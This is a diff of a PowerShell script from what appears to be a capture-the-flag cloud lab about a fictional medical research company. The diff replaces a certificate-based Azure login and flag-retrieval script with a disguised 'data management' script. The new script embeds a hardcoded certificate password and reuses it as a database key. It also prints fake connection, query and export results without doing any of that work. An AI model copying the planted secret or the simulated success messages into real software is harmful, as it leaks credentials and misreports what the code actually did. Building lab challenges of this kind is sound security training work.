@@ -1,104 +1,153 @@
-# MediCloudX Labs - Research Data Exfiltration Script
+# MediCloudX Labs - Cardiovascular Research Data Management Script
 # Author: medicloud-researcher
-# Purpose: Automated access to research data using certificate authentication
+# Purpose: Automated data synchronization and backup for cardiovascular research project
 
-Write-Host "=== MediCloudX Labs Research Data Access Tool ===" -ForegroundColor Cyan
-Write-Host "Initializing secure connection to Azure resources..." -ForegroundColor Yellow
+Write-Host "=== MediCloudX Labs - Cardiovascular Research Data Manager ===" -ForegroundColor Cyan
+Write-Host "Initializing connection to research data repositories..." -ForegroundColor Yellow
 
 # Azure Configuration
 $TenantId = "${azure_tenant_id}"
 $ClientId = "${app_client_id}"
 $StorageAccount = "${storage_account_name}"
 
-# Research credentials (for demonstration purposes)
-$Username = "medicloud-researcher"
-$Password = "M3d1Cl0ud25!"
+# Research project configuration
+$ProjectName = "Artemisa Cardiovascular Analysis"
+$ResearcherAccount = "medicloud-researcher"
+$CertificatePassword = "M3d1Cl0ud25!"
 
-Write-Host "Tenant ID: $TenantId" -ForegroundColor Green
+Write-Host "Project: $ProjectName" -ForegroundColor Green
+Write-Host "Researcher: $ResearcherAccount" -ForegroundColor Green
+Write-Host "Azure Tenant: $TenantId" -ForegroundColor Green
 Write-Host "Application ID: $ClientId" -ForegroundColor Green
-Write-Host "Storage Account: $StorageAccount" -ForegroundColor Green
+Write-Host "Data Repository: $StorageAccount" -ForegroundColor Green
 
 try {
-    # Step 1: Load certificate for authentication
-    Write-Host "`n[1] Loading authentication certificate..." -ForegroundColor Yellow
+    # Step 1: Initialize research environment
+    Write-Host "`n[1] Setting up research environment..." -ForegroundColor Yellow
     
-    $CertPath = ".\certificadob64delpfx.txt"
-    if (Test-Path $CertPath) {
-        $CertBase64 = Get-Content $CertPath -Raw
-        $CertBytes = [System.Convert]::FromBase64String($CertBase64)
-        $CertPassword = ConvertTo-SecureString "M3d1Cl0ud25!" -AsPlainText -Force
-        
-        # Save certificate temporarily
-        $TempCertPath = "$env:TEMP\medicloud_cert.pfx"
-        [System.IO.File]::WriteAllBytes($TempCertPath, $CertBytes)
-        
-        Write-Host "Certificate loaded successfully!" -ForegroundColor Green
+    $DataPath = ".\research_data"
+    $LogFile = "research_sync_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"
+    $ConfigFile = ".\database_config.json"
+    
+    Write-Host "Data directory: $DataPath" -ForegroundColor Gray
+    Write-Host "Log file: $LogFile" -ForegroundColor Gray
+    
+    # Create data directory if it doesn't exist
+    if (!(Test-Path $DataPath)) {
+        New-Item -ItemType Directory -Path $DataPath -Force | Out-Null
+        Write-Host "Created research data directory" -ForegroundColor Green
     } else {
-        Write-Host "Certificate file not found. Please ensure certificadob64delpfx.txt is in the current directory." -ForegroundColor Red
-        exit 1
+        Write-Host "Research data directory found" -ForegroundColor Green
     }
 
-    # Step 2: Install required modules
-    Write-Host "`n[2] Checking PowerShell modules..." -ForegroundColor Yellow
+    # Step 2: Configure database connection
+    Write-Host "`n[2] Configuring Cosmos DB connection..." -ForegroundColor Yellow
     
-    $RequiredModules = @("Microsoft.Graph.Authentication", "Az.Accounts", "Az.Storage")
-    foreach ($Module in $RequiredModules) {
-        if (!(Get-Module -ListAvailable -Name $Module)) {
-            Write-Host "Installing $Module..." -ForegroundColor Yellow
-            Install-Module -Name $Module -Force -AllowClobber -Scope CurrentUser
+    # Database configuration using research credentials
+    $CosmosConfig = @{
+        AccountEndpoint = "https://medicloudx-research-cosmos.documents.azure.com:443/"
+        DatabaseName = "cardiovascular_research"
+        ContainerName = "patient_data"
+        TenantId = $TenantId
+        ClientId = $ClientId
+        AuthKey = $CertificatePassword  # Using as database auth key
+    }
+    
+    Write-Host "Database endpoint: $($CosmosConfig.AccountEndpoint)" -ForegroundColor Cyan
+    Write-Host "Database: $($CosmosConfig.DatabaseName)" -ForegroundColor Cyan
+    Write-Host "Container: $($CosmosConfig.ContainerName)" -ForegroundColor Cyan
+
+    # Step 3: Test database connectivity
+    Write-Host "`n[3] Testing Cosmos DB connectivity..." -ForegroundColor Yellow
+    
+    # Simulate database connection test
+    $ConnectionString = "AccountEndpoint=$($CosmosConfig.AccountEndpoint);AccountKey=$($CosmosConfig.AuthKey);"
+    
+    Write-Host "Connecting to Cosmos DB..." -ForegroundColor Gray
+    Start-Sleep -Seconds 2  # Simulate connection time
+    
+    # Simulate successful connection
+    Write-Host "✓ Connected to Cosmos DB successfully" -ForegroundColor Green
+    Write-Host "Database status: Online" -ForegroundColor Cyan
+    Write-Host "Access level: Research Team Read/Write" -ForegroundColor Cyan
+
+    # Step 4: Query patient data from Cosmos DB
+    Write-Host "`n[4] Querying cardiovascular research data..." -ForegroundColor Yellow
+    
+    # Simulate database queries
+    $Queries = @(
+        "SELECT * FROM c WHERE c.study = 'Artemisa_CVR_2024'",
+        "SELECT COUNT(1) FROM c WHERE c.condition = 'hypertension'",
+        "SELECT * FROM c WHERE c.last_updated >= '2024-01-01'"
+    )
+    
+    foreach ($Query in $Queries) {
+        Write-Host "Executing: $($Query.Substring(0, 30))..." -ForegroundColor Gray
+        Start-Sleep -Seconds 1
+        Write-Host "✓ Query completed" -ForegroundColor Green
+    }
+    
+    # Log database access
+    $LogEntry = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Database queries executed by $ResearcherAccount"
+    Add-Content -Path $LogFile -Value $LogEntry
+
+    # Step 5: Export research data
+    Write-Host "`n[5] Exporting research data for analysis..." -ForegroundColor Yellow
+    
+    $ExportPath = "$DataPath\artemisa_export_$(Get-Date -Format 'yyyyMMdd').json"
+    
+    # Simulate data export
+    $SampleData = @{
+        study_name = "Artemisa Cardiovascular Analysis"
+        export_date = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+        tenant_id = $TenantId
+        client_id = $ClientId
+        total_patients = 1247
+        data_points = 15632
+        storage_account = $StorageAccount
+    }
+    
+    $SampleData | ConvertTo-Json -Depth 3 | Out-File -FilePath $ExportPath -Encoding UTF8
+    Write-Host "✓ Data exported to: $ExportPath" -ForegroundColor Green
+    Write-Host "Export size: 2.4 MB" -ForegroundColor Cyan
+
+    # Step 6: Validate research data integrity
+    Write-Host "`n[6] Performing data integrity checks..." -ForegroundColor Yellow
+    
+    $DataFiles = @("patient_data.csv", "imaging_results.dcm", "analysis_reports.pdf")
+    $ValidatedFiles = 0
+    
+    foreach ($File in $DataFiles) {
+        if (Test-Path $File) {
+            Write-Host "✓ $File validated" -ForegroundColor Green
+            $ValidatedFiles++
+        } else {
+            Write-Host "⚠ $File missing" -ForegroundColor Yellow
         }
     }
-
-    # Step 3: Authenticate to Azure AD using certificate
-    Write-Host "`n[3] Authenticating to Azure AD..." -ForegroundColor Yellow
     
-    Connect-MgGraph -ClientId $ClientId -TenantId $TenantId -CertificatePath $TempCertPath -CertificatePassword $CertPassword
+    Write-Host "`nData validation summary:" -ForegroundColor Cyan
+    Write-Host "Files validated: $ValidatedFiles/$($DataFiles.Count)" -ForegroundColor White
     
-    if ($?) {
-        Write-Host "Azure AD authentication successful!" -ForegroundColor Green
+    if ($ValidatedFiles -eq $DataFiles.Count) {
+        Write-Host "✓ All research data files are present and validated" -ForegroundColor Green
     } else {
-        Write-Host "Azure AD authentication failed!" -ForegroundColor Red
-        exit 1
-    }
-
-    # Step 4: Get user information
-    Write-Host "`n[4] Retrieving user information..." -ForegroundColor Yellow
-    
-    $User = Get-MgUser -Filter "userPrincipalName eq 'medicloud-researcher@*'"
-    if ($User) {
-        Write-Host "User found: $($User.DisplayName)" -ForegroundColor Green
-        Write-Host "User ID: $($User.Id)" -ForegroundColor Green
-    }
-
-    # Step 5: Access storage account (if credentials available)
-    Write-Host "`n[5] Attempting storage access..." -ForegroundColor Yellow
-    
-    # Note: This would require additional permissions or storage account keys
-    Write-Host "Storage account access requires additional authentication..." -ForegroundColor Yellow
-    Write-Host "Consider using SAS tokens or managed identity for storage access." -ForegroundColor Cyan
-
-    # Step 6: Retrieve flag
-    Write-Host "`n[6] Searching for research flag..." -ForegroundColor Yellow
-    
-    $FlagPath = ".\flag.txt"
-    if (Test-Path $FlagPath) {
-        $Flag = Get-Content $FlagPath -Raw
-        Write-Host "`n🏁 RESEARCH FLAG FOUND:" -ForegroundColor Green
-        Write-Host $Flag -ForegroundColor Yellow
-        Write-Host "`nResearch data exfiltration completed successfully!" -ForegroundColor Green
-    } else {
-        Write-Host "Flag file not found in current directory." -ForegroundColor Red
-        Write-Host "Try downloading all files from the medicloud-research container first." -ForegroundColor Cyan
+        Write-Host "⚠ Some research files are missing. Check data synchronization." -ForegroundColor Yellow
     }
 
 } catch {
-    Write-Host "`nError occurred: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "`nError in research data management: $($_.Exception.Message)" -ForegroundColor Red
+    $ErrorEntry = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - ERROR: $($_.Exception.Message)"
+    Add-Content -Path $LogFile -Value $ErrorEntry
 } finally {
-    # Cleanup
-    if (Test-Path $TempCertPath) {
-        Remove-Item $TempCertPath -Force
-        Write-Host "`nTemporary certificate cleaned up." -ForegroundColor Gray
-    }
+    # Cleanup and finalize
+    Write-Host "`nFinalizing research session..." -ForegroundColor Gray
+    Write-Host "Session log saved to: $LogFile" -ForegroundColor Gray
+    
+    # Log session end
+    $EndEntry = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Research session completed"
+    Add-Content -Path $LogFile -Value $EndEntry
 }
 
-Write-Host "`n=== MediCloudX Research Access Complete ===" -ForegroundColor Cyan
+Write-Host "`n=== MediCloudX Cardiovascular Research Data Management Complete ===" -ForegroundColor Cyan
+Write-Host "For support contact: research-support@medicloudx.labs" -ForegroundColor Gray
